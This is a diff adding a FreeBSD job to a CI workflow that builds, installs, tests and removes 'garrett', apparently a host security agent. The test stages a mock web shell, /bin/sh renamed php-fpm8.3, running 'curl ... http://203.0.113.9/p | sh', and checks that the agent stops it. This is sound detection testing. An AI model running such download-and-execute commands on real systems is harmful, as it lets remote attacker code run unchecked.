@@ -93,6 +93,52 @@ jobs:
           sudo apt-get purge -y garrett >/dev/null
           for p in /usr/lib/garrett /usr/bin/garrett /var/lib/garrett /etc/garrett; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
 
+  # FreeBSD has no hosted machines of its own: a FreeBSD system is started inside a Linux one, and everything
+  # (the tests, the install, a stand-in attack, the removal) runs in it.
+  freebsd:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build, test, install and remove on FreeBSD
+        uses: vmactions/freebsd-vm@v1
+        with:
+          usesh: true
+          prepare: pkg install -y rust curl
+          run: |
+            set -e
+            freebsd-version
+            cd rust
+            cargo test --release --locked
+            cargo build --release --locked
+            cd ..
+            mkdir -p /tmp/bundle/garrett
+            cp rust/target/release/garrett /tmp/bundle/garrett/garrett-agent
+            sed 's/\r$//' packaging/garrett > /tmp/bundle/garrett/garrett
+            sed 's/\r$//' packaging/freebsd/install.sh > /tmp/bundle/garrett/install.sh
+            sed 's/\r$//' packaging/freebsd/garrett.rc > /tmp/bundle/garrett/garrett.rc
+            mkdir -p /usr/local/etc && printf 'UPDATE=off\nLEARN_HOURS=0\n' > /usr/local/etc/garrett.conf
+            sh /tmp/bundle/garrett/install.sh
+            sleep 8
+            service garrett status
+            garrett version
+            garrett status
+            garrett hardware
+            tail -5 /var/log/garrett.log || true
+            # A stand-in web shell: a program named like a web server starts a download-and-run shell.
+            mkdir -p /tmp/gv && cp /bin/sh /tmp/gv/php-fpm8.3
+            /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
+            ended=no
+            for i in $(seq 1 60); do sleep 1; pgrep -f "203.0.113.9/p" >/dev/null || { echo "ended after about $i seconds"; ended=yes; break; }; done
+            tail -5 /var/log/garrett.log || true
+            [ "$ended" = yes ]
+            for i in $(seq 1 30); do garrett cases | grep -q "stopped" && break; sleep 1; done
+            garrett cases
+            garrett cases | grep -q "stopped"
+            sh /tmp/bundle/garrett/install.sh --remove
+            for p in /usr/local/lib/garrett /usr/local/bin/garrett /var/db/garrett /usr/local/etc/rc.d/garrett; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
+            ! pgrep -f garrett-agent
+
   macos:
     if: github.event_name == 'workflow_dispatch'
     runs-on: macos-latest
